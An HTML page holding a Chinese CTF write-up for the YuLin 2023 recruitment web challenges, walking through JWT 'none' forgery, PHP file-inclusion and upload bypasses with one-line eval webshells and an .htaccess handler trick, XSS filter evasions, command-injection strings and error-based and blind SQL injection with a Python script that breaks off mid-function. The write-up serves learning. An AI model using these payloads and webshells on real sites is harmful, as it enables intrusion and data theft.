<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>YuLin 2023 Recruit Writeup | Leon's blog😽</title><meta name="author" content="Leon"><meta name="copyright" content="Leon"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="YuLin 2023 Recruit Writeup前言（叠个甲先part1是用word写的，直接黏贴过来量太多就不修改了😭，part2  是用md，可能看起来舒服一点。如果读者看得比较难受，这非常正常，请原谅我的懒惰🙇part1:Tutorial1.http这里要注意，admin是改cookie里的admin&#x3D;1! 2.302跳转 查看源代码找到&#x2F;302.php Curl">
<meta property="og:type" content="article">
<meta property="og:title" content="YuLin 2023 Recruit Writeup">
<meta property="og:url" content="https://foreon.github.io/posts/36124.html">
<meta property="og:site_name" content="Leon&#39;s blog😽">
<meta property="og:description" content="YuLin 2023 Recruit Writeup前言（叠个甲先part1是用word写的，直接黏贴过来量太多就不修改了😭，part2  是用md，可能看起来舒服一点。如果读者看得比较难受，这非常正常，请原谅我的懒惰🙇part1:Tutorial1.http这里要注意，admin是改cookie里的admin&#x3D;1! 2.302跳转 查看源代码找到&#x2F;302.php Curl">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://bu.dusays.com/2023/11/03/6545181570d8a.jpg">
<meta property="article:published_time" content="2023-11-03T15:56:39.000Z">
<meta property="article:modified_time" content="2023-12-02T18:15:14.358Z">
<meta property="article:author" content="Leon">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://bu.dusays.com/2023/11/03/6545181570d8a.jpg"><link rel="shortcut icon" href="https://bu.dusays.com/2023/11/03/654511df35ab1.jpg"><link rel="canonical" href="https://foreon.github.io/posts/36124.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'YuLin 2023 Recruit Writeup',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-12-03 02:15:14'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Leon's blog😽" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/6545103c2e116.jpg" onerror="onerror=null;src='https://bu.dusays.com/2023/11/03/65450afd63db3.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/gallery/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://bu.dusays.com/2023/11/03/6545181570d8a.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Leon's blog😽"><span class="site-name">Leon's blog😽</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/gallery/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">YuLin 2023 Recruit Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-03T15:56:39.000Z" title="发表于 2023-11-03 23:56:39">2023-11-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-02T18:15:14.358Z" title="更新于 2023-12-03 02:15:14">2023-12-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/writeup/">writeup</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>33分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="YuLin 2023 Recruit Writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="YuLin-2023-Recruit-Writeup"><a href="#YuLin-2023-Recruit-Writeup" class="headerlink" title="YuLin 2023 Recruit Writeup"></a>YuLin 2023 Recruit Writeup</h1><h1 id="前言（叠个甲先"><a href="#前言（叠个甲先" class="headerlink" title="前言（叠个甲先"></a>前言（叠个甲先</h1><h3 id="part1是用word写的，直接黏贴过来量太多就不修改了😭，part2-是用md，可能看起来舒服一点。如果读者看得比较难受，这非常正常，请原谅我的懒惰🙇"><a href="#part1是用word写的，直接黏贴过来量太多就不修改了😭，part2-是用md，可能看起来舒服一点。如果读者看得比较难受，这非常正常，请原谅我的懒惰🙇" class="headerlink" title="part1是用word写的，直接黏贴过来量太多就不修改了😭，part2  是用md，可能看起来舒服一点。如果读者看得比较难受，这非常正常，请原谅我的懒惰🙇"></a>part1是用word写的，直接黏贴过来量太多就不修改了😭，part2  是用md，可能看起来舒服一点。如果读者看得比较难受，这非常正常，请原谅我的懒惰🙇</h3><h1 id="part1"><a href="#part1" class="headerlink" title="part1:"></a>part1:</h1><h1 id="Tutorial"><a href="#Tutorial" class="headerlink" title="Tutorial"></a>Tutorial</h1><h1 id="1-http"><a href="#1-http" class="headerlink" title="1.http"></a>1.http</h1><p>这里要注意，admin是改cookie里的admin&#x3D;1!</p>
<p>2.302跳转</p>
<p>查看源代码找到&#x2F;302.php</p>
<p>Curl -i 找到flag</p>
<p>3.encode</p>
<p>关于decode可以看看这个链接</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ruoli-s/p/14206145.html">https://www.cnblogs.com/ruoli-s/p/14206145.html</a></p>
<p>判断第一个是md5</p>
<p>解密得到Yulin</p>
<p>判断第二个是hex编码</p>
<p>解码得到Sec{we_mu5t_kn0w</p>
<p>第三个是base64</p>
<p>解码得到_c0mm0n</p>
<p>判断第四个是html实体编码</p>
<p>解码得到_enc0d1ngs}</p>
<p>组合一下得到flag</p>
<p>YulinSec{we_mu5t_kn0w_c0mm0n _enc0d1ngs}</p>
<p>4.Method</p>
<p>被提示有很多http<br>method</p>
<p>拿postman一个个试就试出来了</p>
<p>5.cal-1</p>
<p>源代码进去改下长度就完事</p>
<p>6.cal-2</p>
<p>发现要用post的方法传数据，就完事了</p>
<p>7.cal-3</p>
<p>用python脚本做</p>
<p>我还学了好一会，感觉python脚本是个大问题</p>
<p>import requests<br>s&#x3D;requests.Session()<br>url&#x3D;’<a target="_blank" rel="noopener" href="http://43.142.109.233:44504/index.php">http://43.142.109.233:44504/index.php</a>‘<br>r&#x3D;s.get(url)  </p>
<p>res&#x3D;r.text  </p>
<p>a&#x3D;res.find(“<p>“)<br>b&#x3D;res.find(“&#x2F;p&gt;”,a)<br>#找到我们要计算的式子的前后位置<br>num&#x3D;res[a+3:b-1]<br>print(a)<br>print(b)<br>print(num)<br>r&#x3D;s.post(url,data&#x3D;{‘result’:eval(num)})<br>print(r.content)</p>
<p>8.https</p>
<p>前言:</p>
<p>经大佬提醒,了解了不少jwt知识</p>
<p>了解到两种主要思路</p>
<p>1.弱口令把key爆出来</p>
<p>2.使用none的方式</p>
<p>由于安装不清楚第一次所需的工具😅，所以采用第二种方法</p>
<p>原理如下所示</p>
<p>本题抓包发现token,于是采用jwt绕过</p>
<p>1.将头部信息的alg值改为none，并进行base64加密</p>
<p>2.将声明部分的admin值改为true，也进行base64加密</p>
<p>3.新组合的JWT应该为<code>头部``.``声明``.</code>(因为头部中的加密方式为none，所以签名部分可以舍去)，但又由于&#x3D;号会与url解码产生歧义，所以需要将&#x3D;号删除，而Base64URL是支持这种写法的</p>
<p>最终的JWT值为ewogICJhbGciOiAibm9uZSIsCiAgInR5cCI6ICJKV1QiCn0.ewogICJhZG1pbiI6ICIxIiwKICAiaWF0IjogMTY5NDk0OTM0NSwKICAiZXhwIjogMTY5NDk1NjU0NSwKICAianRpIjogIjM0YTczNGEzODAzZGY1NmZlYmIzOTg3MzJlOWQwZDE5Igp9.</p>
<p>4.把token放到cookie里得到flag</p>
<p>LFI</p>
<ol>
<li></li>
</ol>
<p>依照提示传参即可</p>
<ol start="2">
<li></li>
</ol>
<p>不知道为啥hackbar的post这类题用不了？</p>
<p>那就用postman来post</p>
<p>使用file&#x3D;php:&#x2F;&#x2F;input + post <?php
system("ls");?></p>
<p>再file&#x3D;php:&#x2F;&#x2F;input + post <?php system("cat
flag_195780473.txt");?></p>
<p>得到flag</p>
<ol start="3">
<li></li>
</ol>
<h5 id="使用data-text-plain-base64-xxxx-base64编码后的数据"><a href="#使用data-text-plain-base64-xxxx-base64编码后的数据" class="headerlink" title="使用data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64编码后的数据)"></a>使用data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64编码后的数据)</h5><p>data:&#x2F;&#x2F;text&#x2F;plain,<?php
system("ls")?></p>
<p>data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4&#x3D;</p>
<p>data:&#x2F;&#x2F;text&#x2F;plain,<?php
system("cat flag_8491675293")?></p>
<p>data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4&#x3D;</p>
<p>得到flag</p>
<ol start="4">
<li></li>
</ol>
<p>看到提示，直接想到用base64编码转出</p>
<p>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p>得到一串base64编码，转码之后即得到flag</p>
<ol start="5">
<li></li>
</ol>
<p>看教程绕过file_get_contents($file) 了但是还对原理一知半解</p>
<p>采用第一种方式就拿到flag了</p>
<ol start="6">
<li></li>
</ol>
<p>文档里说的很清楚了，话说我自己试的一句话木马<?php
@eval($_POST["value"]);?>就不太好使，还得是图片里的这个好使，然后就生成一句话木马图片呗，然后蚁剑</p>
<p><code>&lt;?php</code><br><code>fputs(fopen(“shell.php”,&#39;w&#39;),&#39;&lt;?php @eval($_POST[”leon“])；?&gt;</code></p>
<p><code>&#39;</code><br><code>); ?&gt;</code></p>
<p>要注意的是蚁剑访问的目录是生成的shell.php</p>
<p>即为<a target="_blank" rel="noopener" href="http://43.142.109.233:21005/shell.php">http://43.142.109.233:21005/shell.php</a></p>
<ol start="7">
<li></li>
</ol>
<p>这题花了我大概一天的时间钻研，最终做出来了</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/106665608">LFI 绕过 Session 包含限制 Getshell_通过sessid进行文件写即可,使用 file:&#x2F;&#x2F;localhost&#x2F; 进行绕过_zhang三的博客-CSDN博客</a></p>
<p>先了解session知识吧</p>
<p>Phpinfo先找到session的储存路径</p>
<p>Session自定义一个</p>
<p>然后传一个一句话木马</p>
<p>发现可以控制了</p>
<p>于是果断蚁剑解出</p>
<p>补一个大佬的做法：</p>
<p>思路更清晰一些</p>
<p>XSS</p>
<p>看看这这篇攻略<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42357070/article/details/83818283">XSS挑战赛解题思路_多崎巡礼的博客-CSDN博客</a></p>
<ol>
<li></li>
</ol>
<p>看源代码发现有个hidden的 name</p>
<p>普普通通构造个playload就完事了</p>
<p><code>name=&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<ol start="2">
<li></li>
</ol>
<p>这里我本来想用闭合标签来完成</p>
<p>但是发现&lt;被转义了，只能利用  <code>&#39;onmouseover=alert(1)//</code>，不过这里需要用单引号闭合，构造playload</p>
<ol start="3">
<li></li>
</ol>
<p>和上题一样，只不过把单引号换成双引号来闭合罢了</p>
<ol start="4">
<li></li>
</ol>
<p>第四题发现会把on转成o_n</p>
<p>而且会给<script><br> </script>中间的东西加双引号</p>
<p>于是上网查攻略,知道要用伪协议</p>
<p><code>&quot;&gt;&lt;iframe src=javascript:alert(1)&gt;</code></p>
<p><code>&quot;&gt;&lt;a href=javascript:alert(1)&gt;</code></p>
<p><code>&quot;&gt;</code><br><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;zhouzhong&lt;/a&gt;</code></p>
<p><code>&quot;&gt;&lt;a href=&quot;javascript:%61lert(1)&quot;&gt;zhouzhong&lt;/a&gt; //</code></p>
<p><code>就做出来了</code></p>
<p><code>5.</code></p>
<h2 id="试了试”"><a href="#试了试”" class="headerlink" title="试了试”&gt;"></a>试了试”&gt;</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;<span class="regexp">/script&gt; /</span>/</span><br></pre></td></tr></table></figure>

<p>可能是屏蔽了script,于是思路是双写绕过</p>
<h2 id="alert-0"><a href="#alert-0" class="headerlink" title="&quot;&gt;&lt;scriscriptpt&gt;alert(0)&lt;/scriscriptpt&gt;//"></a><code>&quot;&gt;&lt;scriscriptpt&gt;alert(0)&lt;/scriscriptpt&gt;//</code></h2><p>这些双写也可以</p>
<p>就拿到flag了</p>
<ol start="6">
<li></li>
</ol>
<p>用伪协议发现过滤了javascript，于是查攻略吧</p>
<p><code>javascrip&amp;#x74;:alert(1)</code></p>
<p><code>javasc&amp;#x72;ipt:alert1</code></p>
<p><code>javasc&amp;#x0072;ipt:alert1</code></p>
<ol start="7">
<li></li>
</ol>
<p>第一次见这种，猜测t_sort那里是隐藏的搜索框</p>
<p>于是看攻略吧</p>
<p>这里只要构造如下playload就行</p>
<p><code>t_sort=”type=’’text”</code><br><code>onclick = ”alert(1)</code></p>
<p>复现了一下发现这个双引号”不能用</p>
<p>得用下面的双引号</p>
<p>“</p>
<p>未解之谜，先放这吧</p>
<p><code>t_sort=&quot;type=&quot;text&quot;</code><br><code>onclick = &quot;alert(1)</code></p>
<p>XSS看攻略愉快的ak了</p>
<p>话说真的不是按这个攻略出题的吗(</p>
<p>RCE</p>
<ol>
<li></li>
</ol>
<p>在当前目录下没找，于是 ls &#x2F;</p>
<p>ping<br>127.0.0.1;ls &#x2F; #</p>
<p>找到flag</p>
<p>ping<br>127.0.0.1;cat &#x2F;flag_3124131231 #</p>
<ol start="2">
<li></li>
</ol>
<p>ping<br>127.0.0.1;ls #</p>
<p>有waf</p>
<p>试了一下过滤了;|&amp;’&#96;等等</p>
<p>于是用<code>%0a``绕过</code></p>
<p><code>ip=127.0.0.1%0als /</code></p>
<p>再ip&#x3D;127.0.0.1%0acat<br>&#x2F;flag_31241421414</p>
<p>得到flag</p>
<ol start="3">
<li></li>
</ol>
<p>试了一下过滤了ls</p>
<p>文件上传</p>
<ol>
<li></li>
</ol>
<p>采用了一种新的方式</p>
<p>传一句话木马文件蚁剑后门报错捏</p>
<p>于是火狐禁止js，传一个.php文件上去</p>
<p>路径是复制的图像链接</p>
<p>然后蚁剑后门</p>
<ol start="2">
<li></li>
</ol>
<p>考察.htaccess文件</p>
<p>用记事本写这样一个名为.htaccess的文件</p>
<p>注意保存为所有类型</p>
<p>&lt;FilesMatch<br>“.png”&gt;</p>
<p>  SetHandler application&#x2F;x-httpd-php</p>
</FilesMatch>

<p>该文件的意思是，只要遇到文件名中包含有”.png”字符</p>
<p>串的，统一按照 php 文件来执行。然后就可以上传一个带一句话木马的文件，例如a_php.gif，会</p>
<p>被当成php执行。该方法其实不是漏洞，是Apache的特性。该方法常用于黑客入侵网站之后，不想</p>
<p>被发现，留一个隐蔽的后门。</p>
<p>然后先上传.htaccess文件,再上次木马.png</p>
<p>然后蚁剑就完事了</p>
<ol start="3">
<li></li>
</ol>
<p>上传php文件抓包，修改文件类型为image&#x2F;png</p>
<p>然后就可以上传了，于是愉快的蚁剑</p>
<ol start="4">
<li></li>
</ol>
<p>考察文件头绕过</p>
<p>用winhex</p>
<p>但是这样修改后用蚁剑连接</p>
<p><a target="_blank" rel="noopener" href="http://43.142.109.233:30004/upload/muma.png">http://43.142.109.233:30004/upload/muma.png</a></p>
<p>还是报错，于是再次采用上传php用burp改png的方法</p>
<p>其实也可以换一种生成shell.php的png图片木马</p>
<p>下次再试</p>
<p>然后蚁剑吧</p>
<ol start="5">
<li></li>
</ol>
<p>很明显要绕过黑名单这些</p>
<p>但是明显黑名单太少了，这里先用大写绕过罢</p>
<p>然而大写绕过并不可行？</p>
<p>再次尝试双写绕过，成了，于是蚁剑</p>
<ol start="6">
<li></li>
</ol>
<p>再次尝试双写</p>
<p>发现不行，添加了一个空格</p>
<p>这次大写绕过又行了？</p>
<p>那就蚁剑吧</p>
<ol start="7">
<li></li>
</ol>
<p>提示%00截断</p>
<p>原理如下</p>
<p>照猫画虎就出来了</p>
<ol start="8">
<li></li>
</ol>
<p>考察16进制00截断</p>
<p>Burp上传图片木马抓包</p>
<p>在路径后面加一个1.php+,再在hex里找到+对应的编码，并改成00,就跟上题一样了</p>
<ol start="9">
<li></li>
</ol>
<p>提示白名单，但是试一下又觉得是黑名单？</p>
<p>双写大写绕过都没用，那试试别的吧</p>
<p>莫名奇妙做出来了？</p>
<p>改成这样</p>
<p>注意蚁剑连接phtml还是小心(为什么</p>
<p>这题要再做一遍</p>
<p>为什么这里多了个空格，怎么复现？</p>
<p>再做了一次为什么又没空格了，而且这里路径为什么不需要大写？</p>
<p>11.二次渲染</p>
<p>合成一个gif木马文件，注意文件头要对</p>
<p>还是不行？那还是找一张真正的gif合成吧</p>
<p>现在行了</p>
<p>下载gif，比对没有改变的地方</p>
<p>然后在不改变的地方插入一句话木马</p>
<p>蚁剑连图片链接老报错</p>
<p>去学了一下</p>
<p>其实用一个文件包含漏洞就能用蚁剑连接</p>
<p>要利用include.php?file&#x3D;upload&#x2F;</p>
<p>然后就可以用蚁剑连接了</p>
<p>网页也是可以访问的</p>
<ol start="12">
<li></li>
</ol>
<p>提示是利用move_uploaded_file($temp_file,<br>$img_path)的漏洞，这个函数它有一个特性，会忽略到文件末尾的&#x2F;.</p>
<p>这样上传，然后burp抓包</p>
<p>把名字改成muma.php&#x2F;.</p>
<p>蚁剑连接 &#x2F;upload&#x2F;muma.php发现可以访问了</p>
<ol start="13">
<li></li>
</ol>
<p>顺藤摸瓜找到了原帖（搜索能力也是能力！</p>
<p>直接看原帖吧，哥们代码审计还看不明白</p>
<p>Sql注入</p>
<p>1.普通注入</p>
<p>普普通通的整形闭合</p>
<p>如图所示做完</p>
<ol start="2">
<li></li>
</ol>
<p>提示是报错注入</p>
<p>试了一下是整形闭合捏</p>
<p>以下黏贴之后的代码有问题</p>
<p>爆数据库</p>
<p><a target="_blank" rel="noopener" href="http://43.142.109.233:20002/?id=-1">http://43.142.109.233:20002/?id=-1</a>  and updatexml(1,concat(‘~’,</p>
<p>    substr(</p>
<p>       (select group_concat(schema_name)</p>
<p>       from information_schema.schemata)</p>
<p>    , 1 , 31)</p>
<p>),3)<br>– a</p>
<p>爆表名</p>
<p><a target="_blank" rel="noopener" href="http://43.142.109.233:20002/?id=-1">http://43.142.109.233:20002/?id=-1</a>  and updatexml(1,concat(‘~’,</p>
<p>    substr(</p>
<p>       (select group_concat(table_name)</p>
<p>       from information_schema.tables where<br>table_schema&#x3D;database())</p>
<p>    , 8 , 31)</p>
<p>),3)<br>– a</p>
<p>注意这里要取后面的字符才完整</p>
<p>爆列名</p>
<p><a target="_blank" rel="noopener" href="http://43.142.109.233:20002/?id=-1">http://43.142.109.233:20002/?id=-1</a>  and updatexml(1,concat(‘~’,</p>
<p>    substr(</p>
<p>       (select group_concat(column_name)</p>
<p>       from information_schema.columns where<br>table_name&#x3D;’flag’)</p>
<p>    , 1 , 31)</p>
<p>),3)<br>– a</p>
<p>爆flag</p>
<p><a target="_blank" rel="noopener" href="http://43.142.109.233:20002/?id=-1">http://43.142.109.233:20002/?id=-1</a>  and updatexml(1,concat(‘~’,</p>
<p>    substr(</p>
<p>       (select group_concat(flag)</p>
<p>       from flag)</p>
<p>    , 10 , 31)</p>
<p>),3)<br>– a</p>
<p>注意flag太长显示不完全，分段来看吧</p>
<ol start="3">
<li></li>
</ol>
<p>布尔盲注</p>
<p>一些基础知识</p>
<p>操作</p>
<p>开搞</p>
<p>试了一下发现是整形形闭合</p>
<p><a target="_blank" rel="noopener" href="http://43.142.109.233:20003/?id=1">http://43.142.109.233:20003/?id=1</a><br>and length(database())&#x3D;8</p>
<p>尝试到8发现回显ok,说明数据库名为8</p>
<p>一个个把数据名试出来</p>
<p>推荐二分查找法</p>
<p><a target="_blank" rel="noopener" href="http://43.142.109.233:20003/?id=1">http://43.142.109.233:20003/?id=1</a><br>and ASCII(SUBSTR(database(),2,1)) &#x3D; 101</p>
<p>ok查出来是security</p>
<p>发现搞不定啊,这工程量。。。还得上脚本</p>
<p>import requests</p>
<h1 id="只需要修改url-和-两个payload即可"><a href="#只需要修改url-和-两个payload即可" class="headerlink" title="只需要修改url 和 两个payload即可"></a>只需要修改url 和 两个payload即可</h1><h1 id="目标网址（不带参数）"><a href="#目标网址（不带参数）" class="headerlink" title="目标网址（不带参数）"></a>目标网址（不带参数）</h1><p>url &#x3D; “<a target="_blank" rel="noopener" href="http://43.142.109.233:20003/">http://43.142.109.233:20003/</a>“</p>
<h1 id="猜解长度使用的payload"><a href="#猜解长度使用的payload" class="headerlink" title="猜解长度使用的payload"></a>猜解长度使用的payload</h1><p>payload_len &#x3D; “””?id&#x3D;1 and length(<br>                    (database())<br>                ) &lt; {n} “””</p>
<h1 id="枚举字符使用的payload"><a href="#枚举字符使用的payload" class="headerlink" title="枚举字符使用的payload"></a>枚举字符使用的payload</h1><p>payload_str &#x3D; “””?id&#x3D;1 and ascii(<br>                    substr(<br>                       (database())<br>                    ,{n},1)<br>                ) &#x3D; {r} “””</p>
<h1 id="获取长度"><a href="#获取长度" class="headerlink" title="获取长度"></a>获取长度</h1><p>def getLength(url, payload):<br>    length &#x3D; 1  # 初始测试长度为1<br>    while True:<br>        response &#x3D; requests.get(url&#x3D; url+payload_len.format(n&#x3D; length))</p>
<p>        # 页面中出现此内容则表示成功</p>
<p>        if ‘OK’ in response.text:<br>            print(‘测试长度完成，长度为：’, length,)<br>            return length;<br>        else:<br>            print(‘正在测试长度：’,length)<br>            length +&#x3D; 1  # 测试长度递增</p>
